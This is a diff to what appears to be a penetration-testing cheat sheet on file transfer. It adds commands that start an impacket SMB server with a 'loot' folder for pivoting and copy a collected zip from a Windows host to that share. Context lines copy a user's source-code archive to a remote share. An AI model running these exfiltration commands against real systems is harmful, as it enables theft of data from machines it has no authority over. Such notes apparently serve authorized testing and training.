@@ -153,6 +153,22 @@ copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
 copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 ```
 
+```bash
+# this is for pivoting host 172.16.8.120
+# window -> 172.16.8.120 
+# linux
+sudo fuser -k 445/tcp 2>/dev/null
+mkdir -p /tmp/loot
+sudo impacket-smbserver share /tmp/loot -smb2support \
+    -username x -password x \
+    -ip 127.0.0.1 -port 445
+    
+
+# window
+net use \\172.16.8.120\share /user:x x
+copy C:\temp\20261010100351_inlane.zip \\172.16.8.120\share\
+```
+
 ### FTP
 
 ```bash
